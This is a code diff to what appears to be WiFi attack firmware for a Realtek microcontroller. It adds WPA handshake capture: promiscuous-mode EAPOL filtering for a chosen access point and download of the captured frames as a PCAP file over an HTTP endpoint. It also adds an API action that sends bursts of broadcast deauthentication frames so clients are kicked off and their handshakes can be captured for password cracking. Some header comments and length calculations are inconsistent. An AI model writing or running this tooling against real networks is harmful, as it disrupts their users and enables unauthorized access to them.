@@ -77,6 +77,259 @@ int attackstate = 0;
 bool attack_stop_requested = false;
 
 // ============================================================
+// 握手包抓取功能
+// ============================================================
+#include <stdint.h>
+
+// PCAP文件头(24字节) + 全局头部(20字节) + 每帧头(16字节) + 数据
+static const uint8_t PCAP_GLOBAL_HDR[24] = {
+    0xD4, 0xC3, 0xB2, 0xA1, // magic number (little-endian)
+    0x02, 0x00,             // version 2.4
+    0x04, 0x00,             // timezone
+    0x00, 0x00, 0x00, 0x00, // sigfigs
+    0xFF, 0xFF, 0x00, 0x00, // snaplen (65535)
+    0x01, 0x00, 0x00, 0x00  // link-type: LINKTYPE_IEEE802_11_RADIOTAP (127)
+};
+
+static const uint8_t PCAP_PKT_HDR_TEMPLATE[16] = {
+    0x00, 0x00, 0x00, 0x00, // ts sec
+    0x00, 0x00, 0x00, 0x00, // ts usec
+    0x00, 0x00, 0x00, 0x00, // incl_len (frame length)
+    0x00, 0x00, 0x00, 0x00  // orig_len (original length)
+};
+
+// Radiotap header (present flags: TSFT + Flags + Rate + Channel + Signal)
+static const uint8_t RADIO_HDR[] = {
+    0x00, 0x00,             // version (0)
+    0x0C, 0x00,             // header length (12)
+    0x00, 0x00, 0x00, 0x00, // present flags: TSFT(0) + Flags(1) + Rate(2) + Channel(4) + Signal(8)
+    0x00,                   // flags
+    0x02,                   // rate (1 Mbps)
+    0x08, 0x00,             // channel freq (2048 = 0x800 = 2.4GHz marker)
+    0x10, 0x00,             // channel flags (0x0010 = 2GHz)
+    0xC0, 0x00,             // signal (dBm, -64dBm)
+};
+
+// 环形缓冲区存原始帧
+#define CAPTURE_BUF_FRAMES 128
+static uint8_t capture_buf[CAPTURE_BUF_FRAMES][2048];
+static uint16_t capture_len[CAPTURE_BUF_FRAMES];
+static uint32_t capture_ts[CAPTURE_BUF_FRAMES];
+static int capture_head = 0;
+static int capture_tail = 0;
+static volatile int capture_eapol_count = 0;
+static volatile bool capture_has_handshake = false;
+static volatile int capture_last_eapol = 0;  // 上次循环的EAPOL计数，用于检测新包
+static unsigned long capture_start_ms = 0;
+static int capture_target_index = -1;
+static uint8_t capture_radio_len[CAPTURE_BUF_FRAMES];  // 每帧的radiotap头长度
+
+// 抓包回调（最小化ISR中操作，避免print等阻塞调用）
+void capture_promisc_callback(unsigned char* buffer, unsigned int len, void* user_data) {
+    if (!capture_running || len < 26) return;
+
+    // Radiotap header: 前2字节=length字段
+    // 如果buffer[0]==0x08且buffer[1]==0x00，说明是IEEE 802.11帧头（无radiotap）
+    // 否则radiotap头在前，length在字节2-3
+    uint8_t* ieee;
+    uint8_t radio_len;
+    if (buffer[0] == 0x08 && buffer[1] == 0x00) {
+        // 无radiotap，ieee从0开始
+        ieee = buffer;
+        radio_len = 0;
+    } else {
+        // 有radiotap，从字节2-3读length
+        radio_len = buffer[2] | (buffer[3] << 8);
+        ieee = buffer + radio_len;
+    }
+
+    if ((uint8_t*)(ieee + 24) >= buffer + len) return;
+
+    // 检查帧类型：Data frame (type=2, subtype=8=QoS Data)
+    uint8_t frame_type = ieee[0] & 0x0C;
+    if (frame_type != 0x08) return;
+
+    // To-DS=1, From-DS=0：AP发往客户端，Address1=dst, Address2=AP(BSSID), Address3=src
+    // From-DS=1, To-DS=0：客户端发往AP，Address1=BSSID, Address2=src, Address3=dst
+    uint8_t frame_ctrl = ieee[1];
+    uint8_t to_ds = frame_ctrl & 0x01;
+    uint8_t from_ds = (frame_ctrl >> 1) & 0x01;
+    uint8_t bssid[6];
+    if (!to_ds && from_ds) {
+        memcpy(bssid, ieee + 10, 6); // Address3 = BSSID
+    } else if (to_ds && !from_ds) {
+        memcpy(bssid, ieee + 4, 6);  // Address2 = BSSID
+    } else {
+        return;
+    }
+
+    // 过滤目标BSSID
+    if (capture_bssid[0] || capture_bssid[1] || capture_bssid[2] ||
+        capture_bssid[3] || capture_bssid[4] || capture_bssid[5]) {
+        if (memcmp(bssid, capture_bssid, 6) != 0) return;
+    }
+
+    // LLC/SNAP 头部：AA AA 03
+    uint8_t* llc = ieee + 24;
+    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
+
+    // EtherType
+    uint16_t ether_type = (llc[6] << 8) | llc[7];
+    if (ether_type != 0x888E) return;  // 只关注EAPOL
+
+    // 存到环形缓冲区（最小化操作）
+    int idx = capture_head % CAPTURE_BUF_FRAMES;
+    int frame_total = radio_len + len;
+    if (frame_total > 2048) frame_total = 2048;
+    capture_radio_len[idx] = radio_len;
+    memcpy(capture_buf[idx], buffer, frame_total);
+    capture_len[idx] = frame_total;
+    capture_ts[idx] = millis();
+    capture_head++;
+    capture_eapol_count++;
+    // 4个EAPOL包即握手完成
+    if (capture_eapol_count >= 4) {
+        capture_has_handshake = true;
+    }
+}
+
+// 启动抓包（切换到指定频道，开启混杂模式）
+bool captureStart(int target_idx) {
+    if (capture_running) return false;
+
+    if (target_idx >= 0 && target_idx < (int)scan_results.size()) {
+        WiFiScanResult& r = scan_results[target_idx];
+        memcpy(capture_bssid, r.bssid, 6);
+        capture_channel = r.channel;
+        capture_target_index = target_idx;
+        Serial.print("[CAP] Target: ");
+        Serial.print(r.ssid);
+        Serial.print(" ");
+        for (int i = 0; i < 6; i++) {
+            Serial.print(r.bssid[i], HEX);
+            if (i < 5) Serial.print(":");
+        }
+        Serial.print(" CH");
+        Serial.println(r.channel);
+    } else {
+        memset(capture_bssid, 0, 6);
+        capture_channel = 1;
+        capture_target_index = -1;
+    }
+
+    // 切换到目标信道
+    wifi_set_channel(capture_channel);
+
+    // 清空缓冲区
+    capture_head = 0;
+    capture_tail = 0;
+    capture_eapol_count = 0;
+    capture_has_handshake = false;
+    capture_start_ms = millis();
+
+    // 开启混杂模式 level=3 (所有802.11帧)
+    int ret = wifi_set_promisc(RTW_PROMISC_LEVEL_3, capture_promisc_callback, 1);
+    if (ret != RTW_SUCCESS) {
+        Serial.print("[CAP] promisc failed: ");
+        Serial.println(ret);
+        return false;
+    }
+
+    capture_running = true;
+    Serial.println("[CAP] Started");
+    return true;
+}
+
+// 停止抓包
+void captureStop() {
+    if (!capture_running) return;
+    capture_running = false;
+    wifi_set_promisc(RTW_PROMISC_LEVEL_DISABLE, NULL, 0);
+    Serial.print("[CAP] Stopped. EAPOL=");
+    Serial.print(capture_eapol_count);
+    Serial.print(" frames=");
+    Serial.println(capture_head - capture_tail);
+}
+
+// 生成PCAP到缓冲区（返回pcap数据总大小）
+int buildPcapPacket(uint8_t* out, int max_out) {
+    int offset = 0;
+
+    // PCAP全局头
+    if (offset + 24 > max_out) return offset;
+    memcpy(out + offset, PCAP_GLOBAL_HDR, 24);
+    offset += 24;
+
+    int frames_stored = 0;
+    int cap_tail = capture_tail;
+    while (cap_tail < capture_head && frames_stored < CAPTURE_BUF_FRAMES) {
+        int idx = cap_tail % CAPTURE_BUF_FRAMES;
+        uint16_t frame_len = capture_len[idx];
+        uint32_t ts = capture_ts[idx];
+        uint8_t* frame_data = capture_buf[idx];
+
+        // 写入包头 (Radiotap + IEEE 802.11)
+        int radio_len = 12;
+        int ieee_len = frame_len - 12;
+        int pkt_record_len = 16 + radio_len + ieee_len; // pkt_hdr + radio + ieee
+
+        if (offset + pkt_record_len > max_out) break;
+
+        // 包头：时间戳
+        uint32_t sec = ts / 1000;
+        uint32_t usec = (ts % 1000) * 1000;
+        out[offset++] = sec & 0xFF;
+        out[offset++] = (sec >> 8) & 0xFF;
+        out[offset++] = (sec >> 16) & 0xFF;
+        out[offset++] = (sec >> 24) & 0xFF;
+        out[offset++] = usec & 0xFF;
+        out[offset++] = (usec >> 8) & 0xFF;
+        out[offset++] = (usec >> 16) & 0xFF;
+        out[offset++] = (usec >> 24) & 0xFF;
+        // 写入包长
+        uint16_t pkt_len = radio_len + ieee_len;
+        out[offset++] = pkt_len & 0xFF;
+        out[offset++] = (pkt_len >> 8) & 0xFF;
+        out[offset++] = (pkt_len >> 16) & 0xFF;
+        out[offset++] = (pkt_len >> 24) & 0xFF;
+        // orig_len
+        out[offset++] = pkt_len & 0xFF;
+        out[offset++] = (pkt_len >> 8) & 0xFF;
+        out[offset++] = (pkt_len >> 16) & 0xFF;
+        out[offset++] = (pkt_len >> 24) & 0xFF;
+
+        // Radiotap header (用原始的radiotap头，或生成简化版)
+        uint8_t rlen = capture_radio_len[idx];
+        if (rlen > 0 && rlen <= 64) {
+            // 复制原始radiotap头（修改signal字节）
+            memcpy(out + offset, frame_data, rlen);
+            // Radiotap signal在偏移8处(dBm)
+            int8_t signal = -60;
+            out[offset + 8] = (uint8_t)signal;
+            offset += rlen;
+        } else {
+            // 生成简化radiotap头
+            memcpy(out + offset, RADIO_HDR, 12);
+            int8_t signal = -60;
+            out[offset + 8] = (uint8_t)signal;
+            offset += 12;
+        }
+
+        // IEEE 802.11 frame (从radiotap头之后开始)
+        memcpy(out + offset, frame_data + rlen, ieee_len);
+        offset += ieee_len;
+
+        cap_tail++;
+        frames_stored++;
+    }
+
+    return offset;
+}
+
+// 切换到指定信道
+extern "C" int wifi_set_channel(int channel);
+
+// ============================================================
 // 原有WiFi扫描逻辑（保持不变）
 // ============================================================
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
@@ -390,6 +643,39 @@ void handleClient(WiFiClient& client) {
     else if (path == "/networks") {
         sendNetworksJSON(client);
     }
+    else if (path == "/capture.pcap" || path.startsWith("/capture.pcap?")) {
+        // 下载PCAP文件
+        if (capture_head == capture_tail) {
+            client.print("HTTP/1.1 204 No Content\r\n");
+            client.print("Connection: close\r\n");
+            client.println("\r\n");
+        } else {
+            uint8_t pcap_buf[65536];
+            int pcap_len = buildPcapPacket(pcap_buf, sizeof(pcap_buf));
+            Serial.print("[PCAP] download: ");
+            Serial.print(pcap_len);
+            Serial.println(" bytes");
+
+            client.print("HTTP/1.1 200 OK\r\n");
+            client.print("Content-Type: application/octet-stream\r\n");
+            client.print("Content-Disposition: attachment; filename=capture.pcap\r\n");
+            client.print("Content-Length: ");
+            client.println(pcap_len);
+            client.print("Connection: close\r\n");
+            client.println("\r\n");
+
+            // 分块发送
+            int sent = 0;
+            while (sent < pcap_len) {
+                int chunk = pcap_len - sent;
+                if (chunk > 256) chunk = 256;
+                int n = client.write(pcap_buf + sent, chunk);
+                if (n <= 0) break;
+                sent += n;
+            }
+            client.flush();
+        }
+    }
     else {
         client.print("HTTP/1.1 404 Not Found\r\n");
         client.print("Content-Type: text/plain\r\n");
@@ -473,6 +759,34 @@ void handleAPI(WiFiClient& client, String action, String fullPath) {
         }
         response = "{\"ok\":true,\"msg\":\"All selected\",\"count\":" + String(SelectedVector.size()) + "}";
     }
+    else if (action == "capture_start") {
+        if (capture_running) {
+            response = "{\"ok\":false,\"msg\":\"Capture already running\"}";
+        } else {
+            bool ok = captureStart(indexFromQuery);
+            if (ok) {
+                response = "{\"ok\":true,\"msg\":\"Capture started\",\"target\":" + String(indexFromQuery) + "}";
+            } else {
+                response = "{\"ok\":false,\"msg\":\"Capture start failed\"}";
+            }
+        }
+    }
+    else if (action == "capture_stop") {
+        captureStop();
+        response = "{\"ok\":true,\"msg\":\"Capture stopped\",\"eapol\":" + String(capture_eapol_count) + ",\"frames\":" + String(capture_head - capture_tail) + "}";
+    }
+    else if (action == "capture_deauth") {
+        if (capture_running && capture_target_index >= 0) {
+            WiFiScanResult& r = scan_results[capture_target_index];
+            for (int i = 0; i < 10; i++) {
+                wifi_tx_deauth_frame(r.bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 0x06);
+                delay(10);
+            }
+            response = "{\"ok\":true,\"msg\":\"Deauth sent\"}";
+        } else {
+            response = "{\"ok\":false,\"msg\":\"Capture not running\"}";
+        }
+    }
     else if (action == "reboot") {
         response = "{\"ok\":true,\"msg\":\"Rebooting...\"}";
         sendJSON(client, response);
@@ -506,7 +820,10 @@ void sendStatusJSON(WiFiClient& client) {
     json += "\"selected\":" + sel + ",";
     json += "\"selected_count\":" + String(SelectedVector.size()) + ",";
     json += "\"uptime\":" + String(millis() / 1000) + ",";
-    json += "\"uptime_str\":\"" + String(millis() / 1000) + "s\"";
+    json += "\"uptime_str\":\"" + String(millis() / 1000) + "s\",";
+    json += "\"capture_running\":" + String(capture_running ? "true" : "false") + ",";
+    json += "\"capture_eapol\":" + String(capture_eapol_count) + ",";
+    json += "\"capture_frames\":" + String(capture_head - capture_tail) + "";
     json += "}";
     sendJSON(client, json);
 }
